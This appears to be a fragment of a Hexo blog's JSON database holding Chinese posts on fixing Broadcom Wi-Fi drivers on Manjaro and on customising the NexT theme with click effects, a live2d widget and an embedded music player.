class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dkms status</span><br><span class=\"line\"><span class=\"comment\"># 出现类似信息说明成功</span></span><br><span class=\"line\"><span class=\"comment\"># broadcom-wl, 6.30.223.271, 5.10.59-1-MANJARO, x86_64: installed</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h1><p><a href=\"https://rowe98.github.io/2019/07/19/bodcom_failure/\">论如何在 linux 上正确驱动博通网卡</a></p>\n","site":{"data":{}},"excerpt":"<p>解决基于 Arch Linux 的 Linux 发行版 Manjaro 无法识别博通无线网卡驱动的问题。</p>","more":"<h1 id=\"问题描述\"><a href=\"#问题描述\" class=\"headerlink\" title=\"问题描述\"></a>问题描述</h1><ul>\n<li>找不到无线网络</li>\n<li>找不到无线开关</li>\n</ul>\n<h1 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h1><ol>\n<li>更新系统软件</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo pacman -Syu</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>安装对应的 linux-headers，可在设置查看对应的内核版本</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo pacman -S linux-headers</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>安装博通网卡驱动</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo pacman -S broadcom-wl-dkms</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>重启电脑，这时候应该就解决问题了，输入以下命令验证</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dkms status</span><br><span class=\"line\"><span class=\"comment\"># 出现类似信息说明成功</span></span><br><span class=\"line\"><span class=\"comment\"># broadcom-wl, 6.30.223.271, 5.10.59-1-MANJARO, x86_64: installed</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h1><p><a href=\"https://rowe98.github.io/2019/07/19/bodcom_failure/\">论如何在 linux 上正确驱动博通网卡</a></p>"},{"title":"Hexo 博客美化","date":"2021-08-20T11:33:34.000Z","_content":"\n前面已经可以开始写博客了，但如果还是对界面不怎么满意，那还可以做些小修改，下面记录一下我在 next 主题上做的配置。\n\n<!--more-->\n\n# Next 主题风格\n\nNext 中提供了四种主题风格，可以在主题配置文件`your_blog/themes/next/_config.yml`中进行选择，分别是 Muse、Mist、Pisces、Gemini\n\n我选择的是 Mist 风格\n\n```yml\n# Schemes\n#scheme: Muse\nscheme: Mist\n#scheme: Pisces\n#scheme: Gemini\n```\n\n在 `_config.yml` 文件中有博客主题的相关配置文件，基本的配置都有写明，不懂的可以设置后看看效果或者搜索\n\n# 添加博客自定义图标\n\nHexo 博客的默认图标是`H`，支持自定义图标，可在[bitbug](https://www.bitbug.net/)网站选择图片生成，[iconfont](https://www.iconfont.cn/plus/user/detail?uid=41718)下载，在 `themes/next/_config.yml` 如下地方进行设置：\n\n```yml\nfavicon:\n  small: /images/16x16.png\n  medium: /images/32x32.png\n  apple_touch_icon: /images/128x128.png\n  safari_pinned_tab: /images/logo2.svg\n```\n\n# 鼠标点击特效\n\n在界面中添加点击特效，这里提供两种\n\n1. 红心特效\n   - 在 `/themes/next/source/js/` 下新建文件 `clicklove.js` ，接着把下面的代码拷贝粘贴到 `clicklove.js` 文件中：\n     ```javascript\n     !(function (e, t, a) {\n       function n() {\n         c(\n           \".heart{width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: fixed;}.heart:after{top: -5px;}.heart:before{left: -5px;}\"\n         ),\n           o(),\n           r()\n       }\n       function r() {\n         for (var e = 0; e < d.length; e++)\n           d[e].alpha <= 0\n             ? (t.body.removeChild(d[e].el), d.splice(e, 1))\n             : (d[e].y--,\n               (d[e].scale += 0.004),\n               (d[e].alpha -= 0.013),\n               (d[e].el.style.cssText =\n                 'left:' +\n                 d[e].x +\n                 'px;top:' +\n                 d[e].y +\n                 'px;opacity:' +\n                 d[e].alpha +\n                 ';transform:scale(' +\n                 d[e].scale +\n                 ',' +\n                 d[e].scale +\n                 ') rotate(45deg);background:' +\n                 d[e].color +\n                 ';z-index:99999'))\n         requestAnimationFrame(r)\n       }\n       function o() {\n         var t = 'function' == typeof e.onclick && e.onclick\n         e.onclick = function (e) {\n           t && t(), i(e)\n         }\n       }\n       function i(e) {\n         var a = t.createElement('div')\n         ;(a.className = 'heart'),\n           d.push({\n             el: a,\n             x: e.clientX - 5,\n             y: e.clientY - 5,\n             scale: 1,\n             alpha: 1,\n             color: s(),\n           }),\n           t.body.appendChild(a)\n       }\n       function c(e) {\n         var a = t.createElement('style')\n         a.type = 'text/css'\n         try {\n           a.appendChild(t.createTextNode(e))\n         } catch (t) {\n           a.styleSheet.cssText = e\n         }\n         t.getElementsByTagName('head')[0].appendChild(a)\n       }\n       function s() {\n         return (\n           'rgb(' +\n           ~~(255 * Math.random()) +\n           ',' +\n           ~~(255 * Math.random()) +\n           ',' +\n           ~~(255 * Math.random()) +\n           ')'\n         )\n       }\n       var d = []\n       ;(e.requestAnimationFrame = (function () {\n         return (\n           e.requestAnimationFrame ||\n           e.webkitRequestAnimationFrame ||\n           e.mozRequestAnimationFrame ||\n           e.oRequestAnimationFrame ||\n           e.msRequestAnimationFrame ||\n           function (e) {\n             setTimeout(e, 1e3 / 60)\n           }\n         )\n       })()),\n         n()\n     })(window, document)\n     ```\n   - 在 `themes/next/layout/_layout.swig` 文件末尾添加：\n     ```javascript\n     <!-- 页面点击小红心 -->\n     <script type=\"text/javascript\" src=\"/js/clicklove.js\"></script>\n     ```\n2. 烟火特效\n   * 在 `themes/next/source/js/` 里面建一个叫 `fireworks.js` 的文件，复制代码如下：\n   ```javascript\n   \"use strict\";function updateCoords(e){pointerX=(e.clientX||e.touches[0].clientX)-canvasEl.getBoundingClientRect().left,pointerY=e.clientY||e.touches[0].clientY-canvasEl.getBoundingClientRect().top}function setParticuleDirection(e){var t=anime.random(0,360)*Math.PI/180,a=anime.random(50,180),n=[-1,1][anime.random(0,1)]*a;return{x:e.x+n*Math.cos(t),y:e.y+n*Math.sin(t)}}function createParticule(e,t){var a={};return a.x=e,a.y=t,a.color=colors[anime.random(0,colors.length-1)],a.radius=anime.random(16,32),a.endPos=setParticuleDirection(a),a.draw=function(){ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,0,2*Math.PI,!0),ctx.fillStyle=a.color,ctx.fill()},a}function createCircle(e,t){var a={};return a.x=e,a.y=t,a.color=\"#F00\",a.radius=0.1,a.alpha=0.5,a.lineWidth=6,a.draw=function(){ctx.globalAlpha=a.alpha,ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,0,2*Math.PI,!0),ctx.lineWidth=a.lineWidth,ctx.strokeStyle=a.color,ctx.stroke(),ctx.globalAlpha=1},a}function renderParticule(e){for(var t=0;t<e.animatables.length;t++){e.animatables[t].target.draw()}}function animateParticules(e,t){for(var a=createCircle(e,t),n=[],i=0;i<numberOfParticules;i++){n.push(createParticule(e,t))}anime.timeline().add({targets:n,x:function(e){return e.endPos.x},y:function(e){return e.endPos.y},radius:0.1,duration:anime.random(1200,1800),easing:\"easeOutExpo\",update:renderParticule}).add({targets:a,radius:anime.random(80,160),lineWidth:0,alpha:{value:0,easing:\"linear\",duration:anime.random(600,800)},duration:anime.random(1200,1800),easing:\"easeOutExpo\",update:renderParticule,offset:0})}function debounce(e,t){var a;return function(){var n=this,i=arguments;clearTimeout(a),a=setTimeout(function(){e.apply(n,i)},t)}}var canvasEl=document.querySelector(\".fireworks\");if(canvasEl){var ctx=canvasEl.getContext(\"2d\"),numberOfParticules=30,pointerX=0,pointerY=0,tap=\"mousedown\",colors=[\"#FF1461\",\"#18FF92\",\"#5A87FF\",\"#FBF38C\"],setCanvasSize=debounce(function(){canvasEl.width=2*window.innerWidth,canvasEl.height=2*window.innerHeight,canvasEl.style.width=window.innerWidth+\"px\",canvasEl.style.height=window.innerHeight+\"px\",canvasEl.getContext(\"2d\").scale(2,2)},500),render=anime({duration:1/0,update:function(){ctx.clearRect(0,0,canvasEl.width,canvasEl.height)}});document.addEventListener(tap,function(e){\"sidebar\"!==e.target.id&&\"toggle-sidebar\"!==e.target.id&&\"A\"!==e.target.nodeName&&\"IMG\"!==e.target.nodeName&&(render.play(),updateCoords(e),animateParticules(pointerX,pointerY))},!1),setCanvasSize(),window.addEventListener(\"resize\",setCanvasSize,!1)}\"use strict\";function updateCoords(e){pointerX=(e.clientX||e.touches[0].clientX)-canvasEl.getBoundingClientRect().left,pointerY=e.clientY||e.touches[0].clientY-canvasEl.getBoundingClientRect().top}function setParticuleDirection(e){var t=anime.random(0,360)*Math.PI/180,a=anime.random(50,180),n=[-1,1][anime.random(0,1)]*a;return{x:e.x+n*Math.cos(t),y:e.y+n*Math.sin(t)}}function createParticule(e,t){var a={};return a.x=e,a.y=t,a.color=colors[anime.random(0,colors.length-1)],a.radius=anime.random(16,32),a.endPos=setParticuleDirection(a),a.draw=function(){ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,0,2*Math.PI,!0),ctx.fillStyle=a.color,ctx.fill()},a}function createCircle(e,t){var a={};return a.x=e,a.y=t,a.color=\"#F00\",a.radius=0.1,a.alpha=0.5,a.lineWidth=6,a.draw=function(){ctx.globalAlpha=a.alpha,ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,0,2*Math.PI,!0),ctx.lineWidth=a.lineWidth,ctx.strokeStyle=a.color,ctx.stroke(),ctx.globalAlpha=1},a}function renderParticule(e){for(var t=0;t<e.animatables.length;t++){e.animatables[t].target.draw()}}function animateParticules(e,t){for(var a=createCircle(e,t),n=[],i=0;i<numberOfParticules;i++){n.push(createParticule(e,t))}anime.timeline().add({targets:n,x:function(e){return e.endPos.x},y:function(e){return e.endPos.y},radius:0.1,duration:anime.random(1200,1800),easing:\"easeOutExpo\",update:renderParticule}).add({targets:a,radius:anime.random(80,160),lineWidth:0,alpha:{value:0,easing:\"linear\",duration:anime.random(600,800)},duration:anime.random(1200,1800),easing:\"easeOutExpo\",update:renderParticule,offset:0})}function debounce(e,t){var a;return function(){var n=this,i=arguments;clearTimeout(a),a=setTimeout(function(){e.apply(n,i)},t)}}var canvasEl=document.querySelector(\".fireworks\");if(canvasEl){var ctx=canvasEl.getContext(\"2d\"),numberOfParticules=30,pointerX=0,pointerY=0,tap=\"mousedown\",colors=[\"#FF1461\",\"#18FF92\",\"#5A87FF\",\"#FBF38C\"],setCanvasSize=debounce(function(){canvasEl.width=2*window.innerWidth,canvasEl.height=2*window.innerHeight,canvasEl.style.width=window.innerWidth+\"px\",canvasEl.style.height=window.innerHeight+\"px\",canvasEl.getContext(\"2d\").scale(2,2)},500),render=anime({duration:1/0,update:function(){ctx.clearRect(0,0,canvasEl.width,canvasEl.height)}});document.addEventListener(tap,function(e){\"sidebar\"!==e.target.id&&\"toggle-sidebar\"!==e.target.id&&\"A\"!==e.target.nodeName&&\"IMG\"!==e.target.nodeName&&(render.play(),updateCoords(e),animateParticules(pointerX,pointerY))},!1),setCanvasSize(),window.addEventListener(\"resize\",setCanvasSize,!1)};\n   ```\n   * 在 `themes/next/layout/_layout.swig` 文件末尾添加：\n   `javascript <!-- 页面点击小红心 --> <script type=\"text/javascript\" src=\"/js/clicklove.js\"></script> `\n   打开 `themes/next/_config.yml` 文件，在末尾添加如下标识：\n\n```yml\n# Fireworks\nfireworks: true\n```\n\n重新编译后就有鼠标点击特效啦\n\n# 添加页面人物\n\n在博客目录下执行：\n\n```bash\nnpm install -save hexo-helper-live2d\n```\n\n在 [lived2d](https://github.com/xiazeyu/live2d-widget-models)中选择自己想要的人物形象，例子可在作者网站中查看，[Author's original Blog](https://huaji8.top/post/live2d-plugin-2.0/)。下载命令如下：\n\n```bash\nnpm install live2d-widget-model-wanko\n```\n\n在 `your_blog/_config.yml` 或者 `themes/next/_config.yml` 文件下添加如下配置：\n\n```yml\n# Live2D\n## https://github.com/xiazeyu/live2d-widget.js\n## https://l2dwidget.js.org/docs/class/src/index.js~L2Dwidget.html#instance-method-init\nlive2d:\n  enable: true\n  scriptFrom: local\n  pluginRootPath: live2dw/\n  pluginJsPath: lib/\n  pluginModelPath: assets/\n  tagMode: false\n  model:\n    use: live2d-widget-model-wanko #选择下载过的模型\n  display: #放置位置和大小\n    position: right\n    width: 150\n    height: 300\n  mobile:\n    show: false #是否在手机端显示\n```\n\n# 添加网易云音乐播放\n\n在[网易云音乐](https://music.163.com/)网站搜索自己想添加的音乐，点击生成外链，得到外链 html 代码\n\n```html\n<iframe\n  frameborder=\"no\"\n  border=\"0\"\n  marginwidth=\"0\"\n  marginheight=\"0\"\n  width=\"330\"\n  height=\"86\"\n  src=\"//music.163.com/outchain/player?type=2&id=1471724841&auto=1&height=66\"\n></iframe>\n```\n\n将代码放到自己想要的地方就行啦，如放在侧边栏 `themes/next/layout/_macro/sidebar.swig` 中\n\n# 参考资料\n\n- [Hexo 博客 NexT 主题下添加分类、标签、关于菜单项](https://blog.csdn.net/mqdxiaoxiao/article/details/93644533)\n- [Hexo 博客优化之 Next 主题美化](https://blog.csdn.net/nightmare_dimple/article/details/86661502)\n- [hexo 的 next 主题个性化教程:打造炫酷网站](http://shenzekun.cn/hexo%E7%9A%84next%E4%B8%BB%E9%A2%98%E4%B8%AA%E6%80%A7%E5%8C%96%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B.html)\n- [Hexo 博客第三方主题 next 进阶教程](https://www.jianshu.com/p/1ff2fcbdd155)\n- [Hexo（sakura）添加 live2d 看板动画（可对话，换装互动）](https://blog.csdn.net/cungudafa/article/details/104282643)\n- [Hexo-Next 主题美化](https://zouhua.top/archives/e635378a.html)\n","source":"_posts/2021/08/hexo-beautify.md","raw":"---\ntitle: Hexo 博客美化\ndate: 2021-08-20 19:33:34\ntags:\n  - 博客\ncategories:\n  - 博客\n  - Hexo\n---\n\n前面已经可以开始写博客了，但如果还是对界面不怎么满意，那还可以做些小修改，下面记录一下我在 next 主题上做的配置。\n\n<!--more-->\n\n# Next 主题风格\n\nNext 中提供了四种主题风格，可以在主题配置文件`your_blog/themes/next/_config.yml`中进行选择，分别是 Muse、Mist、Pisces、Gemini\n\n我选择的是 Mist 风格\n\n```yml\n# Schemes\n#scheme: Muse\nscheme: Mist\n#scheme: Pisces\n#scheme: Gemini\n```\n\n在 `_config.yml` 文件中有博客主题的相关配置文件，基本的配置都有写明，不懂的可以设置后看看效果或者搜索\n\n# 添加博客自定义图标\n\nHexo 博客的默认图标是`H`，支持自定义图标，可在[bitbug](https://www.bitbug.net/)网站选择图片生成，[iconfont](https://www.iconfont.cn/plus/user/detail?uid=41718)下载，在 `themes/next/_config.yml` 如下地方进行设置：\n\n```yml\nfavicon:\n  small: /images/16x16.png\n  medium: /images/32x32.png\n  apple_touch_icon: /images/128x128.png\n  safari_pinned_tab: /images/logo2.svg\n```\n\n# 鼠标点击特效\n\n在界面中添加点击特效，这里提供两种\n\n1. 红心特效\n   - 在 `/themes/next/source/js/` 下新建文件 `clicklove.js` ，接着把下面的代码拷贝粘贴到 `clicklove.js` 文件中：\n     ```javascript\n     !(function (e, t, a) {\n       function n() {\n         c(\n           \".heart{width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: fixed;}.heart:after{top: -5px;}.heart:before{left: -5px;}\"\n         ),\n           o(),\n           r()\n       }\n       function r() {\n         for (var e = 0; e < d.length; e++)\n           d[e].alpha <= 0\n             ? (t.body.removeChild(d[e].el), d.splice(e, 1))\n             : (d[e].y--,\n               (d[e].scale += 0.004),\n               (d[e].alpha -= 0.013),\n               (d[e].el.style.cssText =\n                 'left:' +\n                 d[e].x +\n                 'px;top:' +\n                 d[e].y +\n                 'px;opacity:' +\n                 d[e].alpha +\n                 ';transform:scale(' +\n                 d[e].scale +\n                 ',' +\n                 d[e].scale +\n                 ') rotate(45deg);background:' +\n                 d[e].color +\n                 ';z-index:99999'))\n         requestAnimationFrame(r)\n       }\n       function o() {\n         var t = 'function' == typeof e.onclick && e.onclick\n         e.onclick = function (e) {\n           t && t(), i(e)\n         }\n       }\n       function i(e) {\n         var a = t.createElement('div')\n         ;(a.className = 'heart'),\n           d.push({\n             el: a,\n             x: e.clientX - 5,\n             y: e.clientY - 5,\n             scale: 1,\n             alpha: 1,\n             color: s(),\n           }),\n           t.body.appendChild(a)\n       }\n       function c(e) {\n         var a = t.createElement('style')\n         a.type = 'text/css'\n         try {\n           a.appendChild(t.createTextNode(e))\n         } catch (t) {\n           a.styleSheet.cssText = e\n         }\n         t.getElementsByTagName('head')[0].appendChild(a)\n       }\n       function s() {\n         return (\n           'rgb(' +\n           ~~(255 * Math.random()) +\n           ',' +\n           ~~(255 * Math.random()) +\n           ',' +\n           ~~(255 * Math.random()) +\n           ')'\n         )\n       }\n       var d = []\n       ;(e.requestAnimationFrame = (function () {\n         return (\n           e.requestAnimationFrame ||\n           e.webkitRequestAnimationFrame ||\n           e.mozRequestAnimationFrame ||\n           e.oRequestAnimationFrame ||\n           e.msRequestAnimationFrame ||\n           function (e) {\n             setTimeout(e, 1e3 / 60)\n           }\n         )\n       })()),\n         n()\n     })(window, document)\n     ```\n   - 在 `themes/next/layout/_layout.swig` 文件末尾添加：\n     ```javascript\n     <!-- 页面点击小红心 -->\n     <script type=\"text/javascript\" src=\"/js/clicklove.js\"></script>\n     ```\n2. 烟火特效\n   * 在 `themes/next/source/js/` 里面建一个叫 `fireworks.js` 的文件，复制代码如下：\n   ```javascript\n   \"use strict\";function updateCoords(e){pointerX=(e.clientX||e.touches[0].clientX)-canvasEl.getBoundingClientRect().left,pointerY=e.clientY||e.touches[0].clientY-canvasEl.getBoundingClientRect().top}function setParticuleDirection(e){var t=anime.random(0,360)*Math.PI/180,a=anime.random(50,180),n=[-1,1][anime.random(0,1)]*a;return{x:e.x+n*Math.cos(t),y:e.y+n*Math.sin(t)}}function createParticule(e,t){var a={};return a.x=e,a.y=t,a.color=colors[anime.random(0,colors.length-1)],a.radius=anime.random(16,32),a.endPos=setParticuleDirection(a),a.draw=function(){ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,0,2*Math.PI,!0),ctx.fillStyle=a.color,ctx.fill()},a}function createCircle(e,t){var a={};return a.x=e,a.y=t,a.color=\"#F00\",a.radius=0.1,a.alpha=0.5,a.lineWidth=6,a.draw=function(){ctx.globalAlpha=a.alpha,ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,0,2*Math.PI,!0),ctx.lineWidth=a.lineWidth,ctx.strokeStyle=a.color,ctx.stroke(),ctx.globalAlpha=1},a}function renderParticule(e){for(var t=0;t<e.animatables.length;t++){e.animatables[t].target.draw()}}function animateParticules(e,t){for(var a=createCircle(e,t),n=[],i=0;i<numberOfParticules;i++){n.push(createParticule(e,t))}anime.timeline().add({targets:n,x:function(e){return e.endPos.x},y:function(e){return e.endPos.y},radius:0.1,duration:anime.random(1200,1800),easing:\"easeOutExpo\",update:renderParticule}).add({targets:a,radius:anime.random(80,160),lineWidth:0,alpha:{value:0,easing:\"linear\",duration:anime.random(600,800)},duration:anime.random(1200,1800),easing:\"easeOutExpo\",update:renderParticule,offset:0})}function debounce(e,t){var a;return function(){var n=this,i=arguments;clearTimeout(a),a=setTimeout(function(){e.apply(n,i)},t)}}var canvasEl=document.querySelector(\".fireworks\");if(canvasEl){var ctx=canvasEl.getContext(\"2d\"),numberOfParticules=30,pointerX=0,pointerY=0,tap=\"mousedown\",colors=[\"#FF1461\",\"#18FF92\",\"#5A87FF\",\"#FBF38C\"],setCanvasSize=debounce(function(){canvasEl.width=2*window.innerWidth,canvasEl.height=2*window.innerHeight,canvasEl.style.width=window.innerWidth+\"px\",canvasEl.style.height=window.innerHeight+\"px\",canvasEl.getContext(\"2d\").scale(2,2)},500),render=anime({duration:1/0,update:function(){ctx.clearRect(0,0,canvasEl.width,canvasEl.height)}});document.addEventListener(tap,function(e){\"sidebar\"!==e.target.id&&\"toggle-sidebar\"!==e.target.id&&\"A\"!==e.target.nodeName&&\"IMG\"!==e.target.nodeName&&(render.play(),updateCoords(e),animateParticules(pointerX,pointerY))},!1),setCanvasSize(),window.addEventListener(\"resize\",setCanvasSize,!1)}\"use strict\";function updateCoords(e){pointerX=(e.clientX||e.touches[0].clientX)-canvasEl.getBoundingClientRect().left,pointerY=e.clientY||e.touches[0].clientY-canvasEl.getBoundingClientRect().top}function setParticuleDirection(e){var t=anime.random(0,360)*Math.PI/180,a=anime.random(50,180),n=[-1,1][anime.random(0,1)]*a;return{x:e.x+n*Math.cos(t),y:e.y+n*Math.sin(t)}}function createParticule(e,t){var a={};return a.x=e,a.y=t,a.color=colors[anime.random(0,colors.length-1)],a.radius=anime.random(16,32),a.endPos=setParticuleDirection(a),a.draw=function(){ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,0,2*Math.PI,!0),ctx.fillStyle=a.color,ctx.fill()},a}function createCircle(e,t){var a={};return a.x=e,a.y=t,a.color=\"#F00\",a.radius=0.1,a.alpha=0.5,a.lineWidth=6,a.draw=function(){ctx.globalAlpha=a.alpha,ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,0,2*Math.PI,!0),ctx.lineWidth=a.lineWidth,ctx.strokeStyle=a.color,ctx.stroke(),ctx.globalAlpha=1},a}function renderParticule(e){for(var t=0;t<e.animatables.length;t++){e.animatables[t].target.draw()}}function animateParticules(e,t){for(var a=createCircle(e,t),n=[],i=0;i<numberOfParticules;i++){n.push(createParticule(e,t))}anime.timeline().add({targets:n,x:function(e){return e.endPos.x},y:function(e){return e.endPos.y},radius:0.1,duration:anime.random(1200,1800),easing:\"easeOutExpo\",update:renderParticule}).add({targets:a,radius:anime.random(80,160),lineWidth:0,alpha:{value:0,easing:\"linear\",duration:anime.random(600,800)},duration:anime.random(1200,1800),easing:\"easeOutExpo\",update:renderParticule,offset:0})}function debounce(e,t){var a;return function(){var n=this,i=arguments;clearTimeout(a),a=setTimeout(function(){e.apply(n,i)},t)}}var canvasEl=document.querySelector(\".fireworks\");if(canvasEl){var ctx=canvasEl.getContext(\"2d\"),numberOfParticules=30,pointerX=0,pointerY=0,tap=\"mousedown\",colors=[\"#FF1461\",\"#18FF92\",\"#5A87FF\",\"#FBF38C\"],setCanvasSize=debounce(function(){canvasEl.width=2*window.innerWidth,canvasEl.height=2*window.innerHeight,canvasEl.style.width=window.innerWidth+\"px\",canvasEl.style.height=window.innerHeight+\"px\",canvasEl.getContext(\"2d\").scale(2,2)},500),render=anime({duration:1/0,update:function(){ctx.clearRect(0,0,canvasEl.width,canvasEl.height)}});document.addEventListener(tap,function(e){\"sidebar\"!==e.target.id&&\"toggle-sidebar\"!==e.target.id&&\"A\"!==e.target.nodeName&&\"IMG\"!==e.target.nodeName&&(render.play(),updateCoords(e),animateParticules(pointerX,pointerY))},!1),setCanvasSize(),window.addEventListener(\"resize\",setCanvasSize,!1)};\n   ```\n   * 在 `themes/next/layout/_layout.swig` 文件末尾添加：\n   `javascript <!-- 页面点击小红心 --> <script type=\"text/javascript\" src=\"/js/clicklove.js\"></script> `\n   打开 `themes/next/_config.yml` 文件，在末尾添加如下标识：\n\n```yml\n# Fireworks\nfireworks: true\n```\n\n重新编译后就有鼠标点击特效啦\n\n# 添加页面人物\n\n在博客目录下执行：\n\n```bash\nnpm install -save hexo-helper-live2d\n```\n\n在 [lived2d](https://github.com/xiazeyu/live2d-widget-models)中选择自己想要的人物形象，例子可在作者网站中查看，[Author's original Blog](https://huaji8.top/post/live2d-plugin-2.0/)。下载命令如下：\n\n```bash\nnpm install live2d-widget-model-wanko\n```\n\n在 `your_blog/_config.yml` 或者 `themes/next/_config.yml` 文件下添加如下配置：\n\n```yml\n# Live2D\n## https://github.com/xiazeyu/live2d-widget.js\n## https://l2dwidget.js.org/docs/class/src/index.js~L2Dwidget.html#instance-method-init\nlive2d:\n  enable: true\n  scriptFrom: local\n  pluginRootPath: live2dw/\n  pluginJsPath: lib/\n  pluginModelPath: assets/\n  tagMode: false\n  model:\n    use: live2d-widget-model-wanko #选择下载过的模型\n  display: #放置位置和大小\n    position: right\n    width: 150\n    height: 300\n  mobile:\n    show: false #是否在手机端显示\n```\n\n# 添加网易云音乐播放\n\n在[网易云音乐](https://music.163.com/)网站搜索自己想添加的音乐，点击生成外链，得到外链 html 代码\n\n```html\n<iframe\n  frameborder=\"no\"\n  border=\"0\"\n  marginwidth=\"0\"\n  marginheight=\"0\"\n  width=\"330\"\n  height=\"86\"\n  src=\"//music.163.com/outchain/player?type=2&id=1471724841&auto=1&height=66\"\n></iframe>\n```\n\n将代码放到自己想要的地方就行啦，如放在侧边栏 `themes/next/layout/_macro/sidebar.swig` 中\n\n# 参考资料\n\n- [Hexo 博客 NexT 主题下添加分类、标签、关于菜单项](https://blog.csdn.net/mqdxiaoxiao/article/details/93644533)\n- [Hexo 博客优化之 Next 主题美化](https://blog.csdn.net/nightmare_dimple/article/details/86661502)\n- [hexo 的 next 主题个性化教程:打造炫酷网站](http://shenzekun.cn/hexo%E7%9A%84next%E4%B8%BB%E9%A2%98%E4%B8%AA%E6%80%A7%E5%8C%96%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B.html)\n- [Hexo 博客第三方主题 next 进阶教程](https://www.jianshu.com/p/1ff2fcbdd155)\n- [Hexo（sakura）添加 live2d 看板动画（可对话，换装互动）](https://blog.csdn.net/cungudafa/article/details/104282643)\n- [Hexo-Next 主题美化](https://zouhua.top/archives/e635378a.html)\n","slug":"2021/08/hexo-beautify","published":1,"updated":"2022-07-23T14:41:42.291Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clyh3xcj20017zge357951gks","content":"<p>前面已经可以开始写博客了，但如果还是对界面不怎么满意，那还可以做些小修改，下面记录一下我在 next 主题上做的配置。</p>\n<span id=\"more\"></span>\n\n<h1 id=\"Next-主题风格\"><a href=\"#Next-主题风格\" class=\"headerlink\" title=\"Next 主题风格\"></a>Next 主题风格</h1><p>Next 中提供了四种主题风格，可以在主题配置文件<code>your_blog/themes/next/_config.yml</code>中进行选择，分别是 Muse、Mist、Pisces、Gemini</p>\n<p>我选择的是 Mist 风格</p>\n<figure class=\"highlight yml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Schemes</span></span><br><span class=\"line\"><span class=\"comment\">#scheme: Muse</span></span><br><span class=\"line\"><span class=\"attr\">scheme:</span> <span class=\"string\">Mist</span></span><br><span class=\"line\"><span class=\"comment\">#scheme: Pisces</span></span><br><span class=\"line\"><span class=\"comment\">#scheme: Gemini</span></span><br></pre></td></tr></table></figure>\n\n<p>在 <code>_config.yml</code> 文件中有博客主题的相关配置文件，基本的配置都有写明，不懂的可以设置后看看效果或者搜索</p>\n<h1 id=\"添加博客自定义图标\"><a href=\"#添加博客自定义图标\" class=\"headerlink\" title=\"添加博客自定义图标\"></a>添加博客自定义图标</h1><p>Hexo 博客的默认图标是<code>H</code>，支持自定义图标，可在<a href=\"https://www.bitbug.net/\">bitbug</a>网站选择图片生成，<a href=\"https://www.iconfont.cn/plus/user/detail?uid=41718\">iconfont</a>下载，在 <code>themes/next/_config.yml</code> 如下地方进行设置：</p>\n<figure class=\"highlight yml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">favicon:</span></span><br><span class=\"line\">  <span class=\"attr\">small:</span> <span class=\"string\">/images/16x16.png</span></span><br><span class=\"line\">  <span class=\"attr\">medium:</span> <span class=\"string\">/images/32x32.png</span></span><br><span class=\"line\">  <span class=\"attr\">apple_touch_icon:</span> <span class=\"string\">/images/128x128.png</span></span><br><span class=\"line\">  <span class=\"attr\">safari_pinned_tab:</span> <span class=\"string\">/images/logo2.svg</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"鼠标点击特效\"><a href=\"#鼠标点击特效\" class=\"headerlink\" title=\"鼠标点击特效\"></a>鼠标点击特效</h1><p>在界面中添加点击特效，这里提供两种</p>\n<ol>\n<li>红心特效<ul>\n<li>在 <code>/themes/next/source/js/</code> 下新建文件 <code>clicklove.js</code> ，接着把下面的代码拷贝粘贴到 <code>clicklove.js</code> 文件中：<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span 